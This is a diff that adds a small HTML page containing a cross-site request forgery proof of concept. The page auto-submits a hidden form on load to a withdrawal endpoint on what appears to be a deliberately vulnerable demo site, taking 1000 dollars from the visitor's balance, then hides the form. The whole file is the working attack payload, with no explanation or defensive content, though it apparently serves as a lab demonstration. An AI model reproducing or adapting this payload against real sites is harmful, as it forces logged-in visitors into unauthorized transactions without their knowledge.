@@ -1,0 +1,18 @@
+<body>
+<form id="csrf_form" action="http://demo-sql-inject.herokuapp.com/withdrew/" method="POST" name="csrf_form">
+    <input type="text" name="current_balance" value="1000" readonly required id="id_current_balance">
+    <input type="text" name="withdrew" value="1000" required id="id_withrew">
+    <input type="hidden" name="hack" value="true" >
+</form>
+</body>
+<script>
+
+window.addEventListener('DOMContentLoaded', function () {
+    alert("you're been csrfed. You're losing 1000 dollars")
+    document.csrf_form.submit();
+    document.csrf_form.remove();
+    var x  = document.createElement("h3")
+    document.body.appendChild(x);
+})
+
+</script>
